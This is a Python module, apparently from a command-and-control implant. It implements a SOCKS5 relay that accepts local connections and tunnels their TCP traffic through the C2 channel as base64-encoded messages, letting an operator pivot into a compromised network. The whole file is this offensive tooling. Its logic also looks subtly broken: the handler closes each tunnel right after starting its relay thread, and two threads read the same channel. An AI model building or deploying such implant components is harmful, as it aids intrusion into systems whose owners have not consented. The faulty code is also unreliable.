"""SOCKS5 proxy — tunnels TCP connections through C2 protocol."""

import threading
import struct
import socket
import base64
import random


class Socks5Relay:
    """Agent-side SOCKS5 relay — accepts local connections, tunnels via protocol."""

    def __init__(self, protocol, bind_host='127.0.0.1', bind_port=0):
        self._protocol = protocol
        self._bind_host = bind_host
        self._bind_port = bind_port
        self._running = False
        self._tunnels: dict[int, socket.socket] = {}
        self._server: socket.socket = None
        self._actual_port = 0

    def start(self) -> str:
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind((self._bind_host, self._bind_port))
        self._server.listen(10)
        self._actual_port = self._server.getsockname()[1]
        self._running = True
        threading.Thread(target=self._accept_loop, daemon=True).start()
        threading.Thread(target=self._tunnel_reader, daemon=True).start()
        port = self._bind_port if self._bind_port > 0 else self._actual_port
        return f'[+] SOCKS5 relay on {self._bind_host}:{port}'

    def stop(self):
        self._running = False
        try:
            self._server.close()
        except Exception:
            pass

    def _accept_loop(self):
        self._server.settimeout(1.0)
        while self._running:
            try:
                client, addr = self._server.accept()
                tunnel_id = random.randint(10000, 99999)
                self._tunnels[tunnel_id] = client
                threading.Thread(target=self._handle_socks5, args=(client, tunnel_id), daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break

    def _handle_socks5(self, client: socket.socket, tunnel_id: int):
        try:
            client.settimeout(10)
            data = client.recv(1024)
            if len(data) < 3 or data[0] != 0x05:
                client.close()
                return
            client.sendall(bytes([0x05, 0x00]))

            data = client.recv(1024)
            if len(data) < 7 or data[1] != 0x01:
                client.close()
                return

            addr_type = data[3]
            if addr_type == 0x01:
                target = f'{data[4]}.{data[5]}.{data[6]}.{data[7]}'
                port = struct.unpack('!H', data[8:10])[0]
            elif addr_type == 0x03:
                domain_len = data[4]
                target = data[5:5+domain_len].decode()
                port = struct.unpack('!H', data[5+domain_len:7+domain_len])[0]
            else:
                client.close()
                return

            self._protocol.send(f'socks5_connect {tunnel_id} {target} {port}')
            response = self._protocol.recv()
            if 'failed' in str(response):
                client.sendall(bytes([0x05, 0x01, 0x00, 0x01, 0,0,0,0, 0,0]))
                client.close()
                return

            client.sendall(bytes([0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0]))
            threading.Thread(target=self._relay_client, args=(client, tunnel_id), daemon=True).start()

        except Exception:
            pass
        finally:
            self._tunnels.pop(tunnel_id, None)
            try:
                client.close()
            except Exception:
                pass

    def _relay_client(self, client: socket.socket, tunnel_id: int):
        try:
            client.settimeout(0.1)
            while tunnel_id in self._tunnels:
                try:
                    chunk = client.recv(4096)
                    if not chunk:
                        break
                    self._protocol.send(f'socks5_data {tunnel_id} {base64.b64encode(chunk).decode()}')
                except socket.timeout:
                    continue
        except Exception:
            pass

    def _tunnel_reader(self):
        while self._running:
            try:
                msg = str(self._protocol.recv())
                parts = msg.split(None, 2)
                if len(parts) >= 3 and parts[0] == 'socks5_data':
                    tunnel_id = int(parts[1])
                    data = base64.b64decode(parts[2])
                    if tunnel_id in self._tunnels:
                        self._tunnels[tunnel_id].sendall(data)
                elif len(parts) >= 2 and parts[0] == 'socks5_close':
                    tunnel_id = int(parts[1])
                    if tunnel_id in self._tunnels:
                        self._tunnels[tunnel_id].close()
                        del self._tunnels[tunnel_id]
            except Exception:
                pass


def start_socks5(protocol) -> str:
    relay = Socks5Relay(protocol)
    return relay.start()
